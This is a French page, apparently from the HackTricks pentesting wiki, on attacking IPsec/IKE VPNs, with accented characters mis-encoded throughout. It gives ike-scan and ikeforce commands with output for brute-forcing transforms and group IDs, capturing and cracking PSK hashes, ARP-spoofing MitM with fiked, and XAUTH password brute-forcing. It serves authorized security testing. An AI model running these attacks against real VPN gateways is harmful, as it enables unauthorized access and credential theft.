# 500/udp - Pentesting IPsec/IKE VPN

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informations de base

IPsec est la technologie la plus couramment utilis√©e pour les solutions VPN d'entreprise, √† la fois de passerelle √† passerelle (LAN √† LAN) et d'h√¥te √† passerelle (acc√®s distant).

**IKE est un type d'ISAKMP** (Internet Security Association Key Management Protocol), qui est un cadre d'authentification et d'√©change de cl√©s. IKE √©tablit l'association de s√©curit√© (SA) entre deux points de terminaison gr√¢ce √† un processus en trois phases :

* **Phase 1 :** √âtablir un canal s√©curis√© entre 2 points de terminaison √† l'aide d'une cl√© pr√©-partag√©e (PSK) ou de certificats. Il peut utiliser le mode principal (3 paires de messages) ou le mode **agressif**.
* **Phase 1.5 :** C'est facultatif, cela s'appelle la phase d'authentification √©tendue et authentifie l'utilisateur qui essaie de se connecter (utilisateur + mot de passe).
* **Phase 2 :** N√©gocie les param√®tres de s√©curit√© des donn√©es en utilisant ESP et AH. Il peut utiliser un algorithme diff√©rent de celui utilis√© dans la phase 1 (Perfect Forward Secrecy (PFS)).

**Port par d√©faut :** 500/udp

## **D√©couvrez** le service en utilisant nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Trouver une transformation valide**

La configuration IPSec peut √™tre pr√©par√©e pour n'accepter qu'une ou quelques transformations. Une transformation est une combinaison de valeurs. **Chaque transformation** contient un certain nombre d'attributs tels que DES ou 3DES comme algorithme de **chiffrement**, SHA ou MD5 comme algorithme d'**int√©grit√©**, une cl√© pr√©-partag√©e comme type d'**authentification**, Diffie-Hellman 1 ou 2 comme algorithme de **distribution de cl√©** et 28800 secondes comme **dur√©e de vie**.

Ensuite, la premi√®re chose que vous devez faire est de **trouver une transformation valide**, afin que le serveur puisse communiquer avec vous. Pour ce faire, vous pouvez utiliser l'outil **ike-scan**. Par d√©faut, Ike-scan fonctionne en mode principal et envoie un paquet √† la passerelle avec un en-t√™te ISAKMP et une seule proposition avec **huit transformations √† l'int√©rieur**.

En fonction de la r√©ponse, vous pouvez obtenir des informations sur le point de terminaison :
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Comme vous pouvez le voir dans la r√©ponse pr√©c√©dente, il y a un champ appel√© **AUTH** avec la valeur **PSK**. Cela signifie que le VPN est configur√© en utilisant une cl√© pr√©partag√©e (et c'est vraiment bon pour un pentester).\
**La valeur de la derni√®re ligne est √©galement tr√®s importante:**

* _0 handshake retourn√©; 0 notification retourn√©e:_ Cela signifie que la cible n'est pas une passerelle IPsec.
* _**1 handshake retourn√©; 0 notification retourn√©e:**_ Cela signifie que la cible est configur√©e pour IPsec et est pr√™te √† effectuer une n√©gociation IKE, et l'une ou plusieurs des transformations que vous avez propos√©es sont acceptables (une transformation valide sera affich√©e dans la sortie).
* _0 handshake retourn√©; 1 notification retourn√©e:_ Les passerelles VPN r√©pondent par un message de notification lorsque aucune des transformations n'est acceptable (bien que certaines passerelles ne le fassent pas, auquel cas une analyse suppl√©mentaire et une proposition r√©vis√©e doivent √™tre essay√©es).

Dans ce cas, nous avons d√©j√† une transformation valide, mais si vous √™tes dans le troisi√®me cas, vous devez **forcer un peu pour trouver une transformation valide:**

Tout d'abord, vous devez cr√©er toutes les transformations possibles:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Et ensuite, effectuez une attaque par force brute sur chacun d'eux en utilisant ike-scan (cela peut prendre plusieurs minutes) :
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Si la m√©thode de la force brute n'a pas fonctionn√©, il se peut que le serveur r√©ponde sans effectuer de poign√©es de main, m√™me pour des transformations valides. Dans ce cas, vous pouvez essayer la m√™me m√©thode de force brute, mais en utilisant le mode agressif :
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Esp√©rons qu'**une transformation valide soit renvoy√©e**.\
Vous pouvez essayer **la m√™me attaque** en utilisant [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Vous pouvez √©galement essayer de forcer les transformations avec [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

Dans **DH Group: 14 = 2048-bit MODP** et **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (dans ce cas). Le format --trans est $Enc,$Hash,$Auth,$DH**

Cisco recommande d'√©viter en particulier les groupes DH 1 et 2. Les auteurs de l'article d√©crivent comment il est probable que les √âtats-nations puissent d√©crypter les sessions IPsec n√©goci√©es √† l'aide de groupes faibles via la pr√©computation des logarithmes discrets. Les centaines de millions de dollars d√©pens√©s pour effectuer la pr√©computation sont amortis par le d√©cryptage en temps r√©el de toute session utilisant un groupe faible (1 024 bits ou moins).

### Fingerprinting du serveur

Ensuite, vous pouvez utiliser ike-scan pour essayer de **d√©couvrir le fournisseur** du dispositif. L'outil envoie une proposition initiale et arr√™te de rejouer. Ensuite, il **analyse** la **diff√©rence de temps** entre les **messages** re√ßus du serveur et le mod√®le de r√©ponse correspondant, le testeur de p√©n√©tration peut identifier avec succ√®s le fournisseur de la passerelle VPN. De plus, certains serveurs VPN utiliseront la charge utile optionnelle **Vendor ID (VID)** avec IKE.

**Sp√©cifiez la transformation valide si n√©cessaire** (en utilisant --trans)

Si IKE d√©couvre quel est le fournisseur, il l'affichera :
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Cela peut √©galement √™tre r√©alis√© avec le script nmap _**ike-version**_

## Trouver le bon ID (nom de groupe)

Pour √™tre autoris√© √† capturer le hash, vous avez besoin d'une transformation valide prenant en charge le mode Aggressive et le bon ID (nom de groupe). Vous ne conna√Ætrez probablement pas le nom de groupe valide, vous devrez donc le brute-force.\
Pour ce faire, je vous recommande 2 m√©thodes :

### Brute-force de l'ID avec ike-scan

Tout d'abord, essayez de faire une demande avec un ID factice pour essayer de recueillir le hash ("-P") :
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Si **aucun hachage n'est renvoy√©**, alors cette m√©thode de force brute devrait fonctionner. **Si un hachage est renvoy√©, cela signifie qu'un faux hachage va √™tre renvoy√© pour un faux ID, donc cette m√©thode ne sera pas fiable** pour la force brute de l'ID. Par exemple, un faux hachage pourrait √™tre renvoy√© (cela se produit dans les versions modernes) :

![](<../.gitbook/assets/image (110).png>)

Mais si, comme je l'ai dit, aucun hachage n'est renvoy√©, vous devriez essayer de forcer les noms de groupe courants en utilisant ike-scan.

Ce script **essaiera de forcer les IDs possibles** et renverra les IDs o√π une poign√©e de main valide est renvoy√©e (ce sera un nom de groupe valide).

Si vous avez d√©couvert une transformation sp√©cifique, ajoutez-la dans la commande ike-scan. Et si vous avez d√©couvert plusieurs transformations, n'h√©sitez pas √† ajouter une nouvelle boucle pour les essayer toutes (vous devriez les essayer toutes jusqu'√† ce que l'une d'entre elles fonctionne correctement).

Vous pouvez utiliser le [dictionnaire d'ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [celui de seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de noms de groupe courants pour les forcer :
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Ou utilisez ce dictionnaire (qui est une combinaison des deux autres dictionnaires sans r√©p√©titions) :

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Bruteforcer l'ID avec Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) utilise √©galement **ike-scan** pour forcer de mani√®re brutale les noms de groupe possibles. Il suit sa propre m√©thode pour **trouver un ID valide bas√© sur la sortie de ike-scan**.

### Bruteforcer l'ID avec ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) est un outil qui peut √™tre utilis√© pour **forcer de mani√®re brutale les IDs √©galement**. Cet outil **essaiera d'exploiter diff√©rentes vuln√©rabilit√©s** qui pourraient √™tre utilis√©es pour **distinguer un ID valide d'un ID non valide** (il peut y avoir des faux positifs et des faux n√©gatifs, c'est pourquoi je pr√©f√®re utiliser la m√©thode ike-scan si possible).

Par d√©faut, **ikeforce** enverra au d√©but quelques IDs al√©atoires pour v√©rifier le comportement du serveur et d√©terminer la tactique √† utiliser.

* La **premi√®re m√©thode** consiste √† forcer de mani√®re brutale les noms de groupe en **recherchant** les informations **Dead Peer Detection DPD** des syst√®mes Cisco (ces informations ne sont renvoy√©es par le serveur que si le nom de groupe est correct).
* La **deuxi√®me m√©thode** disponible consiste √† **v√©rifier le nombre de r√©ponses envoy√©es √† chaque tentative** car parfois plus de paquets sont envoy√©s lorsque l'ID correct est utilis√©.
* La **troisi√®me m√©thode** consiste √† **rechercher "INVALID-ID-INFORMATION" en r√©ponse √† un ID incorrect**.
* Enfin, si le serveur ne renvoie rien lors des v√©rifications, **ikeforce** essaiera de forcer de mani√®re brutale le serveur et v√©rifiera si lorsque l'ID correct est envoy√©, le serveur renvoie un paquet.\
√âvidemment, l'objectif de la force brute de l'ID est d'obtenir la **PSK** lorsque vous avez un ID valide. Ensuite, avec l'**ID** et la **PSK**, vous devrez forcer de mani√®re brutale le XAUTH (s'il est activ√©).

Si vous avez d√©couvert une transformation sp√©cifique, ajoutez-la dans la commande ikeforce. Et si vous avez d√©couvert plusieurs transformations, n'h√©sitez pas √† ajouter une nouvelle boucle pour les essayer toutes (vous devriez les essayer toutes jusqu'√† ce que l'une d'entre elles fonctionne correctement).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

Il est √©galement possible d'obtenir des noms d'utilisateur valides en √©coutant la connexion entre le client VPN et le serveur, car le premier paquet de mode agressif contenant l'ID du client est envoy√© en clair (d'apr√®s le livre **Network Security Assessment: Know Your Network**)

![](<../.gitbook/assets/image (111).png>)

## Capture et craquage du hash

Enfin, si vous avez trouv√© une **transformation valide** et le **nom du groupe** et si le **mode agressif est autoris√©**, vous pouvez tr√®s facilement r√©cup√©rer le hash crackable :
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Le hash sera enregistr√© dans _hash.txt_.

Vous pouvez utiliser **psk-crack**, **john** (en utilisant [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) et **hashcat** pour **cracker** le hash :
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

La plupart des impl√©mentations utilisent le mode **agressif IKE avec un PSK pour effectuer une authentification de groupe**, et **XAUTH pour fournir une authentification utilisateur suppl√©mentaire** (via Microsoft Active Directory, RADIUS ou similaire). Dans **IKEv2**, **EAP remplace XAUTH** pour authentifier les utilisateurs.

### MitM du r√©seau local pour capturer les identifiants

Ainsi, vous pouvez capturer les donn√©es de connexion en utilisant _fiked_ et voir s'il y a un nom d'utilisateur par d√©faut (vous devez rediriger le trafic IKE vers `fiked` pour l'√©coute, ce qui peut √™tre fait √† l'aide de l'usurpation ARP, [plus d'informations](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked agira en tant que point de terminaison VPN et capturera les identifiants XAuth :
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
De plus, en utilisant IPSec, essayez de r√©aliser une attaque de l'homme du milieu (MitM) et bloquez tout le trafic vers le port 500. Si le tunnel IPSec ne peut pas √™tre √©tabli, il se peut que le trafic soit envoy√© en clair.

### Brute-forcing du nom d'utilisateur et du mot de passe XAUTH avec ikeforce

Pour effectuer une attaque de force brute sur le **XAUTH** (lorsque vous connaissez un nom de groupe valide **id** et le **psk**), vous pouvez utiliser un nom d'utilisateur ou une liste de noms d'utilisateurs et une liste de mots de passe :
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
De cette mani√®re, ikeforce essaiera de se connecter en utilisant chaque combinaison nom d'utilisateur: mot de passe.

Si vous avez trouv√© une ou plusieurs transformations valides, utilisez-les comme dans les √©tapes pr√©c√©dentes.

## Authentification avec un VPN IPSEC

Dans Kali, **VPNC** est utilis√© pour √©tablir des tunnels IPsec. Les **profils** doivent √™tre situ√©s dans _**/etc/vpnc/**_ et vous pouvez utiliser l'outil _**vpnc**_ pour les appeler.\
Exemple tir√© du livre **Network Security Assessment 3rd Edition**:
```
root@kali:~# cat > /etc/vpnc/vpntest.conf << STOP
IPSec gateway 10.0.0.250
IPSec ID vpntest
IPSec secret groupsecret123
IKE Authmode psk
Xauth username chris
Xauth password tiffers1
STOP
root@kali:~# vpnc vpntest
VPNC started in background (pid: 6980)...
root@kali:~# ifconfig tun0
```
## Mat√©riel de r√©f√©rence

* [Article sur le craquage de PSK](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Analyse d'une impl√©mentation VPN](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)

## Shodan

* `port:500 IKE`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives et d√©tecte les probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
